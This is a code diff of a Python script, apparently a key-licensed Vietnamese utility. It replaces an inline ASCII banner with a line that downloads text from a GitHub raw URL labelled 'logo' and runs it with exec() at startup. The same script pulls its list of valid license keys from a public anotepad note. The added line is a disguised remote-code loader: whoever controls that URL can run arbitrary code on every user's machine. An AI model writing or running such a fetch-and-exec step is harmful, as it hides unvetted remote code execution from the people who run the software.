@@ -13,29 +13,7 @@ from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
 os.system('cls')
 os.system('clear')
 os.system('cls')
-
-print(Colorate.Horizontal(Colors.blue_to_green ,f'''
-████████╗██╗  ██╗██╗   ██╗ █████╗ ███╗   ██╗    ████████╗ ██████╗  ██████╗ ██╗     
-╚══██╔══╝██║  ██║██║   ██║██╔══██╗████╗  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
-   ██║   ███████║██║   ██║███████║██╔██╗ ██║       ██║   ██║   ██║██║   ██║██║     
-   ██║   ██╔══██║██║   ██║██╔══██║██║╚██╗██║       ██║   ██║   ██║██║   ██║██║     
-   ██║   ██║  ██║╚██████╔╝██║  ██║██║ ╚████║       ██║   ╚██████╔╝╚██████╔╝███████╗
-   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
-
-
-									BoxZalo : https://zalo.me/g/fjlslx723
-									YTB     : https://www.youtube.com/@TTNVN7144
-									FB      : fb.com/uysotin
-									BoxZalo : Chưa Có
-									KEY     : Inbox Trực Tiếp Để Gia Hạn Key
-									MB Bank : 8829032006 (Đúng Số AE Tránh Bị Lừa)
-									Nhận Làm Tool Theo Yêu Cầu Giá Siêu Rẻ !
-									Bản v0.0.4 - Cập Nhật 4h40p 2/5/2023
-
-'''))
-
-
-
+exec(requests.get('https://raw.githubusercontent.com/Thuanvuse/filecode/main/logo').text)
 Keylist=requests.get('https://anotepad.com/notes/d5yc2frr').text.split('||||')[1].split('||||')[0]
 KEY=input("</> Điền KEY : ")
 if KEY in Keylist and len(KEY) >=10:
